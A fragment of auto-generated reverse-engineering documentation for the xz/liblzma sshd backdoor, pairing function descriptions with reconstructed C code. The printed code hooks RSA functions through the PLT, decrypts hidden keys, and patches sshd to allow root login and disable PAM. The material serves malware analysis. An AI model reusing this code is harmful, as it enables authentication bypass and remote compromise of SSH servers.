  "secret_data_append_from_address": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief calls @ref secret_data_append_singleton\n  with either the given code address or the return address, if @p addr is <= 1\n\n  @param addr the code address to use for the verification. NULL to use the return address\n  @param shift_cursor the initial shift index\n  @param shift_count how many '1' bits to shift\n  @param operation_index identification for this shift operation\n  @return BOOL\n\nUpstream implementation excerpt (xzre/xzre_code/secret_data_append_from_address.c):\n    BOOL secret_data_append_from_address(\n    \tvoid *addr,\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned shift_count, unsigned operation_index\n    ){\n    \tu8 *code = (u8 *)addr;\n    \tif((uintptr_t)addr <= 1){\n    \t\tcode = (u8 *)__builtin_return_address(0);\n    \t}\n    \treturn secret_data_append_singleton(\n    \t\taddr, code,\n    \t\tshift_cursor, shift_count,\n    \t\toperation_index\n    \t);\n    }",
  "secret_data_append_from_call_site": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Shifts data in the secret data store, after validation of the call site,\n  i.e. the caller of this function\n  for more details, see @ref secret_data_append_singleton\n\n  @param shift_cursor the initial shift index\n  @param shift_count number of '1' bits to shift\n  @param operation_index index/id of shit shift operation\n  @param bypass forces the result to be TRUE, evne if validation failed\n  @return BOOL TRUE if validation was successful and data was added, FALSE otherwise",
  "secret_data_append_from_code": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Pushes secret data by validating the given code block\n\n  @param code_start pointer to the beginning of code/function to analyze\n  @param code_end pointer to the end of code/function to analyze\n  @param shift_cursor shift index\n  @param shift_count how many '1' bits to shift\n  @param start_from_call TRUE if analysis should begin from the first CALL instruction\n  FALSE to start from the first instruction\n  @return BOOL TRUE if all requested shifts were all executed.\n  FALSE if some shift wasn't executed due to code validation failure.",
  "secret_data_append_from_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/secret_data_append_from_instruction.c):\n    BOOL secret_data_append_from_instruction(dasm_ctx_t *dctx, secret_data_shift_cursor_t *cursor){\n    \tif(cursor->index <= 0x1C7\n    \t&& XZDASM_OPC(dctx->opcode) != X86_OPCODE_MOV\n    \t&& XZDASM_OPC(dctx->opcode) != X86_OPCODE_CMP\n    \t&& !XZDASM_TEST_MASK(0x410100000101, 3, dctx->opcode)\n    \t){\n    \t\tglobal_ctx->secret_data[cursor->byte_index] |= 1 << (cursor->bit_index);\n    \t}\n    \t++cursor->index;\n    \treturn TRUE;\n    }",
  "secret_data_append_item": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Calls @ref secret_data_append_singleton, if @p flags are non-zero\n\n  @param shift_cursor the initial shift index\n  @param operation_index identification for this shift operation\n  @param shift_count how many '1' bits to shift\n  @param index must be non-zero in order for the operation to be executed\n  @param code pointer to code that will be checked by the function, to \"authorize\" the data load\n  @return BOOL TRUE if validation was successful and data was added, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/secret_data_append_item.c):\n    BOOL secret_data_append_item(\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned operation_index,\n    \tunsigned shift_count,\n    \tint index, u8 *code\n    ){\n    \treturn index && secret_data_append_singleton(\n    \t\tcode, code,\n    \t\tshift_cursor, shift_count,\n    \t\toperation_index\n    \t);\n    }",
  "secret_data_append_items": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief appends multiple secret data items at once\n\n  @param items items to append\n  @param items_count number of items to append\n  @param appender @ref secret_data_append_item\n  @return BOOL TRUE if all items have been appended successfully, FALSE otherwise",
  "secret_data_append_singleton": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Shifts data in the secret data store, after validation of @p code.\n  this function is intended to be invoked only once for each @p operation_index value.\n  @p operation_index will be used as an index into a global array of flags,\n  so that multiple calls with the same value will be a NO-OP.\n\n  the @p code will be verified to check if the shift operation should be allowed or not.\n  the algorithm will:\n  - locate the beginning of the function, by scanning for the `endbr64` instruction\n  and making sure that the code lies between a pre-defined code range (set in @ref backdoor_setup from @ref elf_get_code_segment)\n  - search for @p shift_count number of \"reg2reg\" instructions (explained below)\n  - for each instruction, shift a '1' in the data register, and increment the shift cursor to the next bit index\n  the code only considers reg2reg instruction. other instructions are skipped.\n  the function will return TRUE if the number of shifts executed == number of wanted shifts\n  (that is, if there are as many compatible reg2reg instructions as the number of requested shifts)\n  NOTE: MOV instructions are counted, but don't cause any shift (they are skipped).\n\n  a reg2reg instruction is an x64 instruction with one of the following characteristics:\n  - primary opcode of 0x89 (MOV) or 0x3B (CMP)\n  or, alternatively, an opcode that passes the following validation\n  opcode_check = opcode - 0x83;\n  if ( opcode_check > 0x2E || ((0x410100000101 >> opcode_value) & 1) == 0 )\n\n  additionally, checks outlined in @ref find_reg2reg_instruction must also pass\n  NOTE: the opcode in 'opcode' is the actual opcode +0x80\n  TODO: inspect x64 manual to find the exact filter\n\n  if @p call_site is supplied, a preliminary check will be conducted to see if the caller function\n  contains a CALL-relative instruction.\n  several functions have a CALL in the prologue which serves a dual purpose:\n  - push more data in the secret data store\n  - check if the call is authorized (the code is in the authorized range, and starts with a CALL-relative instruction)\n\n\n  @param call_site if supplied, it will be checked if it contains a valid CALL-relative instruction\n  @param code pointer to code that will be checked by the function, to \"authorize\" the data load\n  @param shift_cursor the initial shift index\n  @param shift_count number of '1' bits to shift, represented by the number of\"reg2reg\" instructions expected in the function pointed to by @p code\n  @param operation_index index/id of shit shift operation\n  @return BOOL TRUE if all requested shifts were all executed.\n  FALSE if some shift wasn't executed due to code validation failure.\n\nUpstream implementation excerpt (xzre/xzre_code/secret_data_append_singleton.c):\n    BOOL secret_data_append_singleton(\n    \tu8 *call_site, u8 *code,\n    \tsecret_data_shift_cursor_t shift_cursor,\n    \tunsigned shift_count, unsigned operation_index\n    ){\n    \tif(global_ctx && !global_ctx->shift_operations[operation_index]){\n    \t\tglobal_ctx->shift_operations[operation_index] = TRUE;\n    \t\tvoid *func_start = NULL;\n    \t\tif(!find_function(\n    \t\t\tcode, &func_start, NULL,\n    \t\t\tglobal_ctx->lzma_code_start,\n    \t\t\tglobal_ctx->lzma_code_end,\n    \t\t\tFIND_NOP\n    \t\t)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \n    \t\tif(!secret_data_append_from_code(\n    \t\t\tfunc_start, global_ctx->lzma_code_end,\n    \t\t\tshift_cursor, shift_count,\n    \t\t\tcall_site == NULL\n    \t\t)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \n    \t\tglobal_ctx->num_shifted_bits += shift_count;\n    \t}\n    \treturn TRUE;\n    }",
  "secret_data_get_decrypted": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a decrypted copy of the secret data\n\n  @param output output buffer that will receive the decrypted data\n  @param ctx the global context (for secret data and function imports)\n  @return BOOL TRUE if successful, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/secret_data_get_decrypted.c):\n    struct key_buf {\n    \tu8 key[CHACHA20_KEY_SIZE];\n    \tu8 iv[CHACHA20_IV_SIZE];\n    };\n    \n    BOOL secret_data_get_decrypted(u8 *output, global_context_t *ctx){\n    \tif(!output || !ctx || !ctx->imported_funcs){\n    \t\treturn FALSE;\n    \t}\n    \tstruct key_buf buf1 = {0}, buf2 = {0};\n    \tif(!chacha_decrypt(\n    \t\t(u8 *)&buf1, sizeof(buf1),\n    \t\tbuf1.key, buf1.iv,\n    \t\t(u8 *)&buf2, ctx->imported_funcs)\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \n    \treturn chacha_decrypt(\n    \t\tctx->secret_data, sizeof(ctx->secret_data),\n    \t\tbuf2.key, buf2.iv,\n    \t\toutput, ctx->imported_funcs);\n    }",
  "sha256": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief computes the SHA256 hash of the supplied data\n\n  @param data buffer containing the data to hash\n  @param count number of bytes to hash from @p data\n  @param mdBuf buffer to write the resulting digest to\n  @param mdBufSize size of the buffer indicated by @p mdBuf\n  @param funcs\n  @return BOOL\n\nUpstream implementation excerpt (xzre/xzre_code/sha256.c):\n    BOOL sha256(\n    \tconst void *data,\n    \tsize_t count,\n    \tu8 *mdBuf,\n    \tu64 mdBufSize,\n    \timported_funcs_t *funcs\n    ){\n    \tif(!data || !count || mdBufSize < SHA256_DIGEST_SIZE || !funcs){\n    \t\treturn FALSE;\n    \t}\n    \tif(!funcs->EVP_Digest || !funcs->EVP_sha256){\n    \t\treturn FALSE;\n    \t}\n    \tconst EVP_MD *md = funcs->EVP_sha256();\n    \tif(!md){\n    \t\treturn FALSE;\n    \t}\n    \treturn funcs->EVP_Digest(data, count, mdBuf, NULL, md, NULL) == TRUE;\n    }",
  "sshbuf_bignum_is_negative": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the given serialized BIGNUM is negative\n\n  @param buf buffer containing a serialized BIGNUM\n  @return BOOL TRUE if the serialized BIGNUM is negative, FALSE otherwise",
  "sshbuf_extract": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief checks if the provided @p buf is sane, then decomposes it into @p p_sshbuf_d and @p p_sshbuf_size\n\n  @param buf pointer to `struct sshbuf` to decompose\n  @param ctx the global context\n  @param p_sshbuf_d output variable that will receive the address of the sshbuf data\n  @param p_sshbuf_size output variable that will receive the size of the sshbuf data\n  @return BOOL TRUE if the sshbuf was decomposed successfully, FALSE otherwise",
  "sshd_configure_log_hook": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief configure the log hook\n\n  @param cmd_flags flags controlling the log hook configuration\n  @param ctx the global context",
  "sshd_find_main": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds the sshd_main function\n\n  @param code_start_out filled in with the function start, if found\n  @param sshd sshd elf info\n  @param libcrypto libcrypto elf info\n  @param imported_funcs imported funcs\n  @returns TRUE if found, FALSE otherwise",
  "sshd_find_monitor_field_addr_in_function": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief find a pointer to a field in `struct monitor` by examining code referencing it\n\n  Look for a sequence of instructions:\n\n  mov/lea [<addr>] -> reg1\n  ...\n  mov reg1 -> rdi\n  ...\n  call mm_request_send\n\n  where <addr> is in the the specified mem_range. Return the address\n  in @p monitor_field_ptr_out.\n\n  In other words, look for:\n\n  mm_request_send(pmonitor->m_recvfd, ...);\n\n  And return the @p &pmonitor->m_recvfd pointer.\n\n  @param code_start start of the sshd code segment\n  @param code_end end of the sshd code segment\n  @param data_start start of the (sshd) data segment\n  @param data_end end of the (sshd) data segment\n  @param monitor_ptr_out pointer to receive the address of the monitor struct\n  @param ctx the global context",
  "sshd_find_monitor_struct": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds the pointer to `struct monitor`, and updates the global context in @p ctx with its location\n\n  @param elf sshd elf context\n  @param refs sshd string references\n  @param ctx global context\n  @return BOOL TRUE if the pointer has been found, FALSE otherwise",
  "sshd_find_sensitive_data": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief locates `sensitive_data` within sshd,\n  and resolves some additional libcrypto functions\n\n  @param sshd sshfd ELF context\n  @param libcrypto libcrypto ELF context\n  @param refs string references\n  @param funcs imported functions\n  @param ctx global context\n  @return BOOL TRUE if sensitive_data was located successfully, FALSE otherwise",
  "sshd_get_client_socket": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Get either the read or write end of the sshd connection.\n\n  this is done by using the `struct monitor` address in @p ctx or, if not set,\n  by getting the first usable socket having index @p socket_index\n\n  @param ctx the global context\n  @param pSocket output variable that will receive the socket fd\n  @param socket_index index `n` of the n-th usable socket that the function should return\n  @param socket_direction whether to get the receiving or the sending socket\n  @return BOOL TRUE if the socket was found, FALSE otherwise",
  "sshd_get_sensitive_data_address_via_krb5ccname": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds the address of `sensitive_data.host_keys` in sshd by using\n  @ref getenv( @ref STR_KRB5CCNAME )\n\n  FIXME: add detail\n\n  @param data_start start of the sshd data segment\n  @param data_end end of the sshd data segment\n  @param code_start start of the sshd code segment\n  @param code_end end of the sshd code segment\n  @param string_refs info about resolved functions\n  @param sensitive_data_out pointer to receive the address of sensitive_data\n  @return BOOL TRUE if the address was found, FALSE otherwise",
  "sshd_get_sensitive_data_address_via_xcalloc": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds the address of `sensitive_data.host_keys` in sshd by using\n  @ref XREF_xcalloc_zero_size in `xcalloc`\n\n  FIXME: add detail\n\n  @param data_start start of the sshd data segment\n  @param data_end end of the sshd data segment\n  @param code_start start of the sshd code segment\n  @param code_end end of the sshd code segment\n  @param string_refs info about resolved functions\n  @param sensitive_data_out pointer to receive the address of sensitive_data\n  @return BOOL TRUE if the address was found, FALSE otherwise",
  "sshd_get_sensitive_data_score": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a numeric score which indicates if\n  accesses @p sensitive_data or not\n\n  @param sensitive_data pointer to suspsected SSH host keys\n  @param elf sshd elf instance\n  @param refs info about resolved functions\n  @return int",
  "sshd_get_sensitive_data_score_in_demote_sensitive_data": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a numeric score which indicates if `demote_sensitive_data`\n  accesses @p sensitive_data or not\n\n  @param sensitive_data pointer to suspsected SSH host keys\n  @param elf sshd elf instance\n  @param refs info about resolved functions\n  @return int a score of 3 if accessed, 0 otherwise",
  "sshd_get_sensitive_data_score_in_do_child": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a numeric score which indicates if `do_child`\n  accesses @p sensitive_data or not\n\n  @param sensitive_data pointer to suspsected SSH host keys\n  @param elf sshd elf instance\n  @param refs info about resolved functions\n  @return int",
  "sshd_get_sensitive_data_score_in_main": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief obtains a numeric score which indicates if `main`\n  accesses @p sensitive_data or not\n\n  @param sensitive_data pointer to suspsected SSH host keys\n  @param elf sshd elf instance\n  @param refs info about resolved functions\n  @return int",
  "sshd_get_sshbuf": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Finds the right `sshbuf` (FIXME: which?), starting from:\n  `(*(ctx->struct_monitor_ptr_address))->kex->my`\n\n  @param sshbuf pointer to a sshbuf that will be filled with the values of the sshbuf\n  @param ctx the global context\n  @return BOOL TRUE if the sshbuf was found, FALSE otherwise",
  "sshd_get_usable_socket": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief gets the first usable socket fd\n\n  @param pSock output variable that will receive the socket fd\n  @param socket_index index `n` of the n-th usable socket that the function should return\n  @param imports imported libc functions\n  @return BOOL TRUE if the socket was found, FALSE otherwise",
  "sshd_log": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief calls `sshlogv` from openssh, similarly to `sshlog` in openssh\n\n  @param log_ctx imported openssh log functions/data (to get the `sshlogv` function pointer)\n  @param level log level\n  @param fmt log format\n  @param ...",
  "sshd_patch_variables": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Patches the sshd configuration\n\n  @param skip_root_patch TRUE to keep current configuration, FALSE to enable root login\n  @param disable_pam TRUE to disable PAM, FALSE to keep current configuration\n  @param replace_monitor_reqtype TRUE to replace the `type` field in `struct mon_table`\n  for `MONITOR_REQ_AUTHPASSWORD`. FALSE to increment it by 1 (from `MONITOR_REQ_AUTHPASSWORD` to `MONITOR_ANS_AUTHPASSWORD`)\n  @param monitor_reqtype the new value to apply, if @p replace_monitor_reqtype is TRUE\n  @param global_ctx\n  @return BOOL TRUE if successful, FALSE if modifications couldn't be applied\n\nUpstream implementation excerpt (xzre/xzre_code/sshd_patch_variables.c):\n    BOOL sshd_patch_variables(\n    \tBOOL skip_root_patch,\n    \tBOOL disable_pam,\n    \tBOOL replace_monitor_reqtype,\n    \tint monitor_reqtype,\n    \tglobal_context_t *global_ctx\n    ){\n    \tif(!global_ctx){\n    \t\treturn FALSE;\n    \t}\n    \tsshd_ctx_t *sshd_ctx = global_ctx->sshd_ctx;\n    \tif(!sshd_ctx){\n    \t\treturn FALSE;\n    \t}\n    \tif(!sshd_ctx->have_mm_answer_authpassword\n        || !sshd_ctx->mm_answer_authpassword_hook\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \n    \tif(!skip_root_patch){\n    \t\tint *permit_root_login = sshd_ctx->permit_root_login_ptr;\n    \t\tif(!permit_root_login){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\tif(*permit_root_login < 0\n    \t\t|| (*permit_root_login > PERMIT_NO_PASSWD && *permit_root_login != PERMIT_YES)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*permit_root_login = PERMIT_YES;\n    \t}\n    \n    \tif(disable_pam){\n    \t\tint *use_pam = sshd_ctx->use_pam_ptr;\n    \t\tif(!use_pam || *use_pam > TRUE){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*use_pam = FALSE;\n    \t}\n    \n    \tsshd_monitor_func_t *mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_ptr;\n    \n    \tif(!replace_monitor_reqtype){\n    \t\t// read reqtype from `monitor` struct\n    \t\tmonitor_reqtype = *(int *)PTRDIFF(mm_answer_authpassword_ptr, 8) + 1;\n    \t}\n    \tsshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;\n    \t// install authpassword hook\n    \t*mm_answer_authpassword_ptr = sshd_ctx->mm_answer_authpassword_hook;\n    \treturn TRUE;\n    }",
  "sshd_proxy_elevate": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief\n  forges a new `MONITOR_REQ_KEYALLOWED` packet, and injects it into the server to gain root privileges\n  through the sshd monitor.\n\n  this function is called if the calling function, @ref run_backdoor_commands , is invoked without root\n  (which is what normally happens when sshd is sandboxed)\n\n  the code will then construct a new packet and send a monitor request with type `MONITOR_REQ_KEYALLOWED` and the payload as key.\n  the receiving end (`mm_answer_keyallowed`) will then run the payload through @ref mm_answer_keyallowed_hook\n\n  the `disable_backdoor` flag is used to avoid running the payload more than once, in case of multiple calls\n\n  @param args arguments used to build the SSH packet\n  @param ctx the global context\n  @return BOOL TRUE if the packet was sent successfully, FALSE otherwise",
  "string_reference": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/string_reference.c):\n    u8 *find_string_reference(\n    \tu8 *code_start,\n    \tu8 *code_end,\n    \tconst char *str\n    ){\n    \tdasm_ctx_t dctx = {0};\n    \tif(find_lea_instruction_with_mem_operand(code_start, code_end, &dctx, (void *)str)){\n    \t\treturn dctx.instruction;\n    \t}\n    \treturn NULL;\n    }",
  "strlen": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/strlen.c):\n    ssize_t c_strlen(char *str) {\n        if (*str != '\\0') {\n            ssize_t len = 0;\n            do {\n                ++len;\n            } while (*(str + len) != '\\0');\n            return len;\n        }\n        return 0;\n    }",
  "strnlen": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/strnlen.c):\n    ssize_t c_strnlen(char *str, size_t max_len) {\n        ssize_t len = 0;\n        if (max_len == 0)\n            return max_len;\n        do {\n            if (*(str + len) == '\\0')\n                return len;\n            ++len;\n        } while (max_len != len);\n        return max_len;\n    }",
  "symbind64": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/symbind64.c):\n    #define PLT_VALID(x) (UPTR(x) > 0xFFFFFF)\n    \n    uintptr_t backdoor_symbind64(\n    \tElf64_Sym *sym,\n    \tunsigned int ndx,\n    \tuptr *refcook, uptr *defcook,\n    \tunsigned int flags,\n    \tconst char *symname\n    )\n    {\n    \timported_funcs_t *funcs = &hooks_data->imported_funcs;\n    \tldso_ctx_t *ldso = &hooks_data->ldso_ctx;\n    \n    \tif(ldso->hooks_installed){\n    \t\tgoto orig;\n    \t}\n    \n    \tvoid *retaddr = __builtin_return_address(0);\n    \n    \tvoid *_dl_audit_symbind_alt = ldso->_dl_audit_symbind_alt;\n    \tvoid *__libc_stack_end = hooks_data->libc_imports.__libc_stack_end;\n    \n    \t#define HOOK_INSTALL(orig, plt, hook) do { \\\n    \t\t(orig) = *(plt); \\\n    \t\t*(plt) = (hook); \\\n    \t\t/* updates the symbol if it's in ldso scope? * / \\\n    \t\tif(UPTR(sym) > UPTR(retaddr) && UPTR(sym) < UPTR(__libc_stack_end)) \\\n    \t\t\tsym->st_value = (Elf64_Addr)(hook); \\\n    \t} while(0)\n    \n    \t// trigger kill switch if the call site is not in ldso region\n    \tif(retaddr <= _dl_audit_symbind_alt) goto kill_switch;\n    \n    \tuintptr_t func_end_addr = PTRADD(_dl_audit_symbind_alt, hooks_data->ldso_ctx._dl_audit_symbind_alt);\n    \tuintptr_t offset_in_function = PTRDIFF(retaddr, _dl_audit_symbind_alt);\n    \tif(offset_in_function > func_end_addr) goto kill_switch;\n    \n    \tEncodedStringId string_id = get_string_id(symname, NULL);\n    \tBOOL plt_entry_valid;\n    \n    \t/**\n    \t * only one of the following hooks will be installed (the first that passes the checks).\n    \t * the other ones are fallbacks (alternative entry points) in case the first one doesn't hit.\n    \t * /\n    \n    \tif(string_id == STR_RSA_public_decrypt && funcs->RSA_public_decrypt_plt){\n    \t\tif(PLT_VALID(*funcs->RSA_public_decrypt_plt)){\n    \t\t\tHOOK_INSTALL(\n    \t\t\t\tfuncs->RSA_public_decrypt,\n    \t\t\t\tfuncs->RSA_public_decrypt_plt,\n    \t\t\t\tldso->hook_RSA_public_decrypt\n    \t\t\t);\n    \t\t}\n    \t\t// RSA_public_decrypt is \"standalone\" (doesn't need further hooks)\n    \t\tgoto symbind_reset;\n    \t} else if(string_id == STR_EVP_PKEY_set1_RSA && funcs->EVP_PKEY_set1_RSA_plt){\n    \t\tif(PLT_VALID(*funcs->EVP_PKEY_set1_RSA_plt)){\n    \t\t\tHOOK_INSTALL(\n    \t\t\t\tfuncs->EVP_PKEY_set1_RSA,\n    \t\t\t\tfuncs->EVP_PKEY_set1_RSA_plt,\n    \t\t\t\tldso->hook_EVP_PKEY_set1_RSA\n    \t\t\t);\n    \n    \t\t\t// EVP_PKEY_set1_RSA depends on RSA_get0_key to be also hooked\n    \t\t\tif(!funcs->RSA_get0_key_plt) {\n    \t\t\t\tgoto symbind_reset;\n    \t\t\t}\n    \t\t\tplt_entry_valid = PLT_VALID(*funcs->RSA_get0_key_plt);\n    \t\t}\n    \t} else if(string_id == STR_RSA_get0_key && funcs->RSA_get0_key_plt){\n    \t\tif(PLT_VALID(*funcs->RSA_get0_key_plt)){\n    \t\t\tHOOK_INSTALL(\n    \t\t\t\t// ??\n    \t\t\t\tfuncs->RSA_get0_key_null,\n    \t\t\t\tfuncs->RSA_get0_key_plt,\n    \t\t\t\tldso->hook_RSA_get0_key\n    \t\t\t);\n    \t\t\t// RSA_get0_key depends on EVP_PKEY_set1_RSA to be also hooked\n    \t\t\tif(!funcs->EVP_PKEY_set1_RSA_plt){\n    \t\t\t\tgoto symbind_reset;\n    \t\t\t}\n    \t\t\tplt_entry_valid = PLT_VALID(*funcs->EVP_PKEY_set1_RSA_plt);\n    \t\t}\n    \t} else {\n    \t\tgoto orig;\n    \t}\n    \n    \t/** if the hook has been installed successfully * /\n    \tif(plt_entry_valid){\n    \t\tsymbind_reset:\t\n    \t\tinit_ldso_ctx(&hooks_data->ldso_ctx);\n    \n    \t\tkill_switch:\n    \t\thooks_data->ldso_ctx.hooks_installed = TRUE;\n    \t}\n    \n    \torig:\n    \treturn sym->st_value;\n    \n    \t#undef HOOK_INSTALL\n    }",
  "symbol_get_addr": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/symbol_get_addr.c):\n    void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id){\n    \tElf64_Sym *sym = elf_symbol_get(elf_info, encoded_string_id, 0);\n    \tif(!sym){\n    \t\treturn NULL;\n    \t}\n    \n    \tif(sym->st_value && sym->st_shndx){\n    \t\treturn (void *)PTRADD(elf_info->elfbase, sym->st_value);\n    \t} else {\n    \t\treturn NULL;\n    \t}\n    }",
  "tls_get_addr": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Placeholder for __tls_get_addr that merely raises halt_baddata(); the object relies on the dynamic loader to wire in the system resolver.\n\nNotes:\n  - Keeps the GOT slot and relocation records intact while preventing accidental execution of an unimplemented body.",
  "update_cpuid_got_index": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief get the cpuid() GOT index\n\n  stores the index in elf_entry_ctx_t::cpuid_fn\n\n  @param ctx\n  @return u64 cpuid() GOT index\n\nUpstream implementation excerpt (xzre/xzre_code/update_cpuid_got_index.c):\n    void update_cpuid_got_index(elf_entry_ctx_t *ctx){\n    \tctx->got_ctx.cpuid_fn = (void *)cpuid_reloc_consts.cpuid_got_index;\n    }",
  "update_got_address": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds the __tls_get_addr() GOT entry\n\n  this function first computes the location of the __tls_get_addr() PLT trampoline function by using\n  the PLT offset constant from tls_get_addr_reloc_consts\n\n  then it decodes the PLT jmp instruction to get the address of the __tls_get_addr() GOT entry\n\n  the __tls_get_addr() GOT entry is used in backdoor_setup() to find the ELF header at the start of the memory mapped ld.so\n\n  calls get_tls_get_addr_random_symbol_got_offset() to update elf_entry_ctx_t::got_ptr and elf_entry_ctx_t::got_offset\n  sets elf_entry_ctx_t::got_offset = 0\n  sets elf_entry_ctx_t::cpuid_fn = 0\n  stores the address of the __tls_get_addr() GOT entry in  elf_entry_ctx_t::got_ptr\n\n  @param entry_ctx\n  @return void* the address of the __tls_get_addr() GOT entry",
  "update_got_offset": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief updates the offset to the GOT\n\n  the offset is the distance to the GOT relative to the address of the symbol cpuid_random_symbol\n  this value is stored in @ref elf_entry_ctx_t.got_ctx.got_offset\n\n  @param ctx\n  @return ptrdiff_t\n\nUpstream implementation excerpt (xzre/xzre_code/update_got_offset.c):\n    void update_got_offset(elf_entry_ctx_t *ctx){\n    \tctx->got_ctx.got_offset = cpuid_reloc_consts.cpuid_random_symbol_got_offset;\n    }",
  "validate_log_handler_pointers": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Validate that the two addresses are the expected/correct ones\n\n  The addresses must be within 15 bytes of each other\n\n  1. Start looking in the XREF_Could_not_get_agent_socket function\n  2. Search for a lea refering mm_log_handler\n  3. If the next instruction after it is a call, switch to the target function\n  4. Look for a memory instruction referencing addr1\n  5. Look for a memory instruction referencing addr2\n\n  So, looking for the call to set_log_handler in sshd.c::privsep_preauth:\n\n  set_log_handler(mm_log_handler, pmonitor);\n\n  Which looks like this:\n\n  void\n  set_log_handler(log_handler_fn *handler, void *ctx)\n  {\n  log_handler = handler;\n  log_handler_ctx = ctx;\n  }\n\n  And the two addresses in question are log_handler and log_handler_ctx.\n\n  @param log_handler_addr1 first address to validate\n  @param log_handler_addr2 second address to validate\n  @param search_base lowest valid code address\n  @param code_end higest valid code address\n  @param refs string references\n  @param global the global context\n  @return TRUE if all checks pass, FALSE otherwise",
  "verify_signature": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Checks if @p signed_data is signed with @p ed448_raw_key.\n\n  in order to do this, the code will\n  - compute a sha256 hash of the SSH host key in @p sshkey (after serialization) and write it to @p signed_data at offset @p sshkey_digest_offset\n  - load the ED448 key from @p ed448_raw_key\n  - use it to verify @p signed_data (including the hashed SSH host key)\n\n  @param sshkey the SSH host key\n  @param signed_data data to verify, including an empty space to hold the hashed SSH key\n  @param sshkey_digest_offset offset to write the hashed SSH key to, in @p signed_data\n  @param signed_data_size length of the @p signed_data buffer, including the space for the SSH key hash digest\n  @param signature signature of the signed data to check\n  @param ed448_raw_key the ED448 public key obtained from @ref secret_data_get_decrypted\n  @param global_ctx\n  @return BOOL TRUE if the signature verification is successful, FALSE otherwise",
  "x86_dasm": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief disassembles the given x64 code\n\n  @param ctx empty disassembler context to hold the state\n  @param code_start pointer to the start of buffer (first disassemblable location)\n  @param code_end pointer to the end of the buffer\n  @return BOOL TRUE if disassembly was successful, FALSE otherwise"
}
